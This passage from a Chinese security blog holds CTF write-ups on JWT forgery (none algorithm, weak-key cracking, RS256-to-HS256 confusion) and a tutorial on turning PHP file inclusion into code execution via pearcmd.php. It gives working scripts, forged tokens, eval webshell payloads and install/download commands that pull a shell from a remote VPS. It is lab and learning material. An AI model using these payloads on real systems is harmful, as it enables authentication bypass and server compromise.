<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJBRyI6IjI1NGEwYzcyNzY2YWM4N30iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJGTCI6ImN0Zmh1Yns2YTAwYTMxMzAifQ.uPFtXGkmPcxJiivPldw_Ek93HwLeem9VDO1vwJZO0HY</span><br></pre></td></tr></table></figure>

<p>拿去解码得到</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420162816882.png" alt="image-20240420162816882"></p>
<p>最终flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;6a00a3130254a0c72766ac87&#125;</span><br></pre></td></tr></table></figure>



<h6 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h6><p>题目描述：</p>
<p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。</p>
<p>————</p>
<p>打开后还是登录，登录成功后可以看到<code>Hello 1(guest), only admin can get flag.</code>,应该就是要伪造admin，抓包看看，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.2Y5_56UX1H_28WxpkOq3eZ6AB-JeyLH-mXwimgwhew8</span><br></pre></td></tr></table></figure>

<p>拿去解密，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要将role改为admin</p>
<p>结合题目描述直接使用脚本签名为none的jwt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;&quot;</span>, <span class="comment"># 密钥，此处置为空</span></span><br><span class="line">    algorithm=<span class="string">&quot;none&quot;</span>, <span class="comment"># 加密方式</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>

<p>生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiYWRtaW4ifQ.</span><br></pre></td></tr></table></figure>

<p>再次<strong>在当前目录(index.php)发包</strong>，成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420164328912.png" alt="image-20240420164328912"></p>
<p>flag如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;158cb73238f8b1378e1a6fe8&#125;</span><br></pre></td></tr></table></figure>

<h6 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h6><p>题目描述:<br>如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。尝试获取flag</p>
<p>————</p>
<p>第一次登录后显示<code>Hello 1(guest), only admin can get flag.</code></p>
<p>再次刷新获取资源，此时就会携带jwt向服务器发送请求，抓包获取得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.NHdRZ0DlkPjGsxP_ApUMag_hbFoqOZIbpwuNaa9PSYg</span><br></pre></td></tr></table></figure>

<p>解码得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接用工具爆破</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420165241660.png" alt="image-20240420165241660"></p>
<p>得到密钥为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eslu</span><br></pre></td></tr></table></figure>

<p>再在<a href="https://jwt.io/#encoded-jwt">jwt.io</a>伪造jwt即可</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420165338094.png" alt="image-20240420165338094"></p>
<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiYWRtaW4ifQ.dAS6XdJSP08cxTDGETnLjsrCduMn12gimm5s0dhwFC8</span><br></pre></td></tr></table></figure>

<p>再次在获取资源页面发包</p>
<p>成功得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;2afa10ab9a76e138e01604a4&#125;</span><br></pre></td></tr></table></figure>



<h6 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h6><p>题目描述:<br>有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。</p>
<p>————</p>
<p>打开题目给了源码，稍微审计一下源码，给了公钥地址，直接访问<code>/publickey.pem</code>，得到公钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs2Zu6nNtgFv8Y3VRd4gm</span><br><span class="line">Wvqd+fkAvvBcve+1VIDpLCFSwBB9tz894Dt8c5RiU3bzSfCWFlhHYh7gWOP1Tvfc</span><br><span class="line">DNcmFkye4ce+ccnrrAE/nasF7OXoK2sZjgWdcjuT1n5MobKsD+DjJdlY0J4aZ+PS</span><br><span class="line">yjrK3UReEN5HEAnKG8H23eyKU5y8FOUjiF0s1YE7E1q4gZ14lCPCdyUfgNjje592</span><br><span class="line">lgOHhiRRxkPpg/jUYNtTNAJVsS1UBNw+06Dk5TharBklC4N9z47nkbSM90KDBe/K</span><br><span class="line">+nyPeqTqzvzCvY8WY/ml7lenkkvS38TkKI5Snu8H3a5ZNOCBdCYF1X8OFymtX85J</span><br><span class="line">zQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>

<p>直接登录，返回了一串字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.E5u_xfY9UrHQd1XBHKHKzgtw5kta7NhkbLmJnRXU_vQJphtf3BPonDwc1L3d8kZUG8JloGNQwVTy4xg6dgIZaCJPpl0m3tiizBEY9LOp33Avt7ZMGUXfo3P5z-VSr7uIVXm9b_z6R8OD5jy_Z3k_yoblzAxRSCoR5a8wGWVdKeIEQTFX7kfO4uOJ-zQinFvIK9ipki6_3-rXuyLOnx-CFAqaSKJ6wfPqSGTuKzatCs3HNcp4TI3f5M0_Qmn09kbzvlTMdQsVg5k45LceMGD38QdtaW4zOcIiPIuKp90rtYo3r12KMklJ0J11SZnsTdCPk6lsB925wK6H6sPy45Jr9Q </span><br></pre></td></tr></table></figure>

<p>应该是返回的jwt，拿去解密看看。得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要将算法和role修改，直接使用脚本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hmac</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">key = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz6rR8Hafw5UZquuWnmBO</span><br><span class="line">x0cqkv5UFmuhra0dbtI92yV2pvvSJo/157cn//rXm5C5t0jkYFNjy+YSKk0Pv9sD</span><br><span class="line">YtGB2BjE9bHyV7wroZ82V8a6YWaerPcOK3Jp2kPn1tUp93I0yGeNLZCFD0bOoIXJ</span><br><span class="line">8RixwtFVHjbRNu7f1x0BTpg51JfI5/r4HAbkjyako2JuVFMF77Kj9DdkWg+SfvYA</span><br><span class="line">IF/5Az5/0pjZT90CwgvMAuB6eLJ7b7XhGdLX9ttTgDpFzLIeCPNIK0PhF2qNMx0/</span><br><span class="line">XllkqXk4fPEPW/BaCfw6rasqsq3a+lSiLcb2QMHRJ39nQ12KiPb/m8AoILOulA3G</span><br><span class="line">pwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">header = &#x27;&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;&#x27;</span><br><span class="line">payload = &#x27;&#123;&quot;username&quot;: &quot;root&quot;, &quot;role&quot;: &quot;admin&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(&quot;utf-8&quot;))</span><br><span class="line">encodeHeader = str(encodeHBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line"></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(&quot;utf-8&quot;))</span><br><span class="line">encodePayload = str(encodePBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line"></span><br><span class="line">token = (encodeHeader + &quot;.&quot; + encodePayload)</span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(bytes(key, &quot;UTF-8&quot;), token.encode(&quot;utf-8&quot;), hashlib.sha256).digest()).decode(&quot;UTF-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line">print(token + &quot;.&quot; + sig)</span><br></pre></td></tr></table></figure>

<p>生成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJyb290IiwgInJvbGUiOiAiYWRtaW4ifQ.ga1VAIojVGWB2b70fAN2OkBv0I6xCqBFtSj5KJvfiKk</span><br></pre></td></tr></table></figure>

<p>抓回包在获取资源的GET页面伪造token，再放包成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420175625851.png" alt="image-20240420175625851"></p>
<p>flag如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;6ec9f26fdf733354f0c75c4c&#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结:<strong>都是在获取资源页面（一般都是GET请求）伪造token来获取其他资源</strong>，需要注意。</strong></p>
<h5 id="polarctf"><a href="#polarctf" class="headerlink" title="polarctf"></a>polarctf</h5><h6 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h6><p>打开即是注册登录界面，如实操作后并没有flag，</p>
<p>然后在抓包界面看到如下jwt:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8SGkFhdaEt0zvByKBtz1oO8ikAFCDHblv1iPowur7e0</span><br></pre></td></tr></table></figure>

<p>拿去网站解密一下，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>尝试爆破密钥</strong>，这里使用**<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>**工具爆破密钥，成功得到密钥为<code>SYSA</code>：<br><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240418205910130.png" alt="image-20240418205910130"></p>
<p>再通过jwt.io修改username为admin来伪造jwt</p>
<p>抓包修改username为admin，成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240419194521275.png" alt="image-20240419194521275"></p>
<p>成功得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ec39c705cfb5295f9dddcedc819a1659&#125;</span><br></pre></td></tr></table></figure>



<p><strong>总结</strong>：还是要有敏感性，为什么刚好Jwt那里只有username，为而刚好对应不能将敏感信息写入jwt，这是就应该联想到flag在密码或者邮箱，继续学习。</p>
<p>其他参考：</p>
<p>2022祥云杯 - FunWEB</p>
<p>NewstarCTF 2023 - Ye’s Pickle</p>
]]></content>
      <categories>
        <category>jwt</category>
      </categories>
  </entry>
  <entry>
    <title>利用pearcmd.php进行文件包含</title>
    <url>/2024/04/28/pearcmd.php/</url>
    <content><![CDATA[<h3 id="pearcmd-php"><a href="#pearcmd-php" class="headerlink" title="pearcmd.php"></a>pearcmd.php</h3><p>好看，爱看，多看</p>
<span id="more"></span>

<p><strong>文件包含还可以利用<code>pearcmd.php</code>这个pecl&#x2F;pear中的文件。</strong></p>
<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7,4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装</p>
<p><strong>不过，在Docker任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径一般在<code>/usr/local/lib/php</code>。</strong></p>
<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。<strong>但当遇到是一个文件包含的场景，那么我们就可以包含到pear中的文件</strong>，进而利用其中的特性搞事。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>有pear扩展（这样才能有pearcmd.php）</li>
<li>php开启了<code>register_argc_argv</code>选项</li>
<li>知道pearcmd.php的路径（默认路径是&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php）</li>
<li>有包含点，能包含php后缀的文件，而且没有open_basedir的限制</li>
</ul>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>注意：以下测试均是镜像为<code>php:7.2-apache</code>并且<code>register_argc_argv</code>为On</p>
<p><strong>对于<code>register_argc_argv</code>选项，</strong>如果这个选项字段选了<code>ON</code>的话，**URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，而且就算后面的内容含有等号也会被作为键值被赋值给<code>$_SERVER[&#39;argv&#39;]</code>**，如下所示：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427211536292.png" alt="image-20240427211536292"></p>
<p>pear程序在执行pear命令的时候会在<code>pearcmd.php</code>获取命令行参数，看看pearcmd.php代码：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">PEAR_Command::setFrontendType(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line">$all_commands = PEAR_Command::getCommands();</span><br><span class="line"></span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line"><span class="regexp">//</span> fix CGI sapi oddity - the -- in pear.bat/pear is <span class="keyword">not</span> removed</span><br><span class="line"><span class="keyword">if</span> (php_sapi_name() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; isset($argv[<span class="number">1</span>]) &amp;&amp; $argv[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    unset($argv[<span class="number">1</span>]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, <span class="string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>$argv</code>的赋值，再看看pear获取命令行参数的函数<code>Consoles/Getopt.php-&gt;readPHPArgv()</code>：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($argv)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array($_SERVER[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@is_array($GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    $msg = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里先看<code>$argv</code>是否存在（这个变量储存在命令行模式下运行php脚本时传入的参数），如果不存在，就尝试<code>$_SERVER[&#39;argc&#39;]</code>是否存在，注意这个参数我们可通过<code>query-string</code>控制。（个人看了几篇文章，应该都是直接利用<code>$SERVER[&#39;argv&#39;]</code>，稍微注意一下）</p>
<p>看一看可以利用的参数：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427210050568.png" alt="image-20240427210050568"></p>
<p>其中的<code>config-create</code>、<code>install</code>、<code>download</code>可以尝试利用。</p>
<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>这里需要包含pearcmd.php的原因就是这样才能执行pear程序。</p>
<h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><p>为了方便理解后面的payload，这里稍微提前说一点知识，</p>
<ul>
<li>如上所说，<code>register_argc_argv</code>选项为On的时候，URL中?后面的内容都会传入<code>$_SERVER[&#39;x&#39;]</code>，但是对于不同符号有区别，看下图比较：</li>
</ul>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222128934.png" alt="image-20240426222128934"></p>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222206499.png" alt="image-20240426222206499"></p>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222235994.png" alt="image-20240426222235994"></p>
<p><strong>由此可以很容易看出&amp;是无法分割参数的，真正能优先分隔参数的是+号。</strong></p>
<ul>
<li>为什么最前面需要一个+号？看看我们的payload传上去后变量的值，如下：</li>
</ul>
<p><img src="/2024/04/28/pearcmd.php/image-20240427223551642.png" alt="image-20240427223551642"></p>
<p>这里可以看到数组下标为0的内容为空，此时结合pearcmd.php的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="line">if (php_sapi_name() != &#x27;cli&#x27; &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == &#x27;--&#x27;) &#123;</span><br><span class="line">    unset($argv[1]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, &quot;c:C:d:D:Gh?sSqu:vV&quot;);</span><br><span class="line">if (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意if条件的内容，以及<code>array_shift()</code>函数，函数说明如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427224040193.png" alt="image-20240427224040193"></p>
<p>注意if条件的内容，这个if语句的处理是直接对argv[1]进行分析，所以第一个元素不会发挥作用，故这里需要将第一个单元利用+设置为空字符或其他不会影响pear命令正常执行的参数都可以</p>
<p>同时可以看看这个函数，个人感觉还是挺有关系的。</p>
<h6 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h6><p>对于这个命令，<strong>主要作用就是将内容写入文件中</strong>，需要传入两个参数，第一个参数会被写入到文件中，其中第二个参数是写入的文件路径。</p>
<p>构造出的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/hello.php</span><br><span class="line"></span><br><span class="line">注意：可以这样设置一句话木马：</span><br><span class="line">&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt; </span><br><span class="line">防止多个输出，推荐！！</span><br></pre></td></tr></table></figure>

<p>然后<strong>包含hello.php用蚁剑或者直接连就行</strong>。</p>
<p>测试了一下，不能直接在浏览器上传payload，由于直接在浏览器传参使得php的如<code>&lt;</code>和单引号等标签因被URL编码而失去效应，<strong>需要抓包后再传参</strong>这样才能被识别为php代码，可以防止浏览器将传入的字符编码。</p>
<p><strong>对比一下即可：</strong></p>
<p>正常抓包后传参：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428013848033.png" alt="image-20240428013848033"></p>
<p>直接传参结果如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428014007326.png" alt="image-20240428014007326"></p>
<p>可以很明显的看出第一张图片中的一句话木马成功作为php代码被解析，所以可以正常利用，</p>
<p>但是第二章图片也可以看出来并没有正常解析，<strong>所以谨记要抓包后传参。</strong></p>
<p><strong>一定注意</strong>：需要抓包后修改，因为浏览器会url编码再传入，会导致php的如<code>&lt;</code>等标签会被编码而失去效应</p>
<h6 id="install"><a href="#install" class="headerlink" title="install"></a>install</h6><p>可以利用install远程连接一个vps下载文件到靶机的临时目录里，再包含这个文件达成rce。</p>
<p><code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录</p>
<p>使用的payload为(基本上不行，主要看下面那个)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://xxx.xxx/123.php</span><br></pre></td></tr></table></figure>

<p>同样还是抓包传payload（方便），页面回显</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428015602654.png" alt="image-20240428015602654"></p>
<p>这串Payload下载后的文件保存的路径是<code>&amp;file=/usr/local/lib/php/pearcmd.php&amp;/tmp/pear/download</code>，显示不可写，这是配置问题，因为这个目录时新建的，没有权限对其写入从而导致失败。</p>
<p><strong>另外的payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http:<span class="comment">//[ip]:[port]/shell.txt</span></span><br></pre></td></tr></table></figure>

<p>抓包放包后页面如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428022500841.png" alt="image-20240428022500841"></p>
<p>这里给出了路径，然后去包含这个路径即可</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428022535506.png" alt="image-20240428022535506"></p>
<p>测试了一下，<strong>这个shell文件最好不要是php文件，只要有php特征即可</strong>，反正文件包含在识别到后会当做php文件执行。</p>
<h6 id="download"><a href="#download" class="headerlink" title="download"></a>download</h6><p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://xxxxxxx/shell.jpg</span><br></pre></td></tr></table></figure>

<p>这个是直接下载到当前页面。</p>
<p>一直没复现出来，最后要用的时候再搜吧。这里显示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">downloading shell.txt ...</span><br><span class="line">Could not download from &quot;http://47.100.223.173/shell.txt&quot; (could not open /var/www/html/shell.txt for writing)</span><br><span class="line">Invalid or missing remote package file</span><br><span class="line">download failed</span><br></pre></td></tr></table></figure>

<h6 id="写入配置文件"><a href="#写入配置文件" class="headerlink" title="写入配置文件"></a>写入配置文件</h6><p>类似于第一个，也复现成功</p>
<p>其他的利用方式，个人感觉挺好的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear -c /tmp/shell.php -d man_dir=&lt;?=eval($_POST[&#x27;x&#x27;]);?&gt; -s</span><br></pre></td></tr></table></figure>

<p>看看选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@VM-0-6-ubuntu:~/somefile# pear help options</span><br><span class="line">Options:</span><br><span class="line">     -v         increase verbosity level (default 1)</span><br><span class="line">     -q         be quiet, decrease verbosity level</span><br><span class="line">     -c file    find user configuration in `file&#x27;</span><br><span class="line">     -C file    find system configuration in `file&#x27;</span><br><span class="line">     -d foo=bar set user config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -D foo=bar set system config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -G         start in graphical (Gtk) mode</span><br><span class="line">     -s         store user configuration</span><br><span class="line">     -S         store system configuration</span><br><span class="line">     -u foo     unset `foo&#x27; in the user configuration</span><br><span class="line">     -h, -?     display help/usage (this message)</span><br><span class="line">     -V         version information</span><br></pre></td></tr></table></figure>

<p>相当于写配置到<code>/tmp/.feng.php</code>,payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/shell.php+-d+man_dir=&lt;?eval($_POST[&#x27;x&#x27;]);?&gt;+-s+</span><br></pre></td></tr></table></figure>

<p>复现成功：<br><img src="/2024/04/28/pearcmd.php/image-20240428032008052.png" alt="image-20240428032008052"></p>
<h5 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h5><p>当<code>pearcmd</code>关键词被ban，可以使用<code>peclcmd.php</code>作为平替，在这个php文件中其实就是引用了pearcmd.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (&#x27;/www/server/php/52/lib/php&#x27; != &#x27;@&#x27;.&#x27;include_path&#x27;.&#x27;@&#x27;) &#123;</span><br><span class="line">    ini_set(&#x27;include_path&#x27;, &#x27;/www/server/php/52/lib/php&#x27;);</span><br><span class="line">    $raw = false;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br><span class="line">    $raw = true;</span><br><span class="line">&#125;</span><br><span class="line">define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);</span><br><span class="line">require_once &#x27;pearcmd.php&#x27;;</span><br></pre></td></tr></table></figure>





<p>参考文章:<br><code>https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html</code></p>
<p><code>https://blog.csdn.net/Mrs_H/article/details/122386511</code></p>
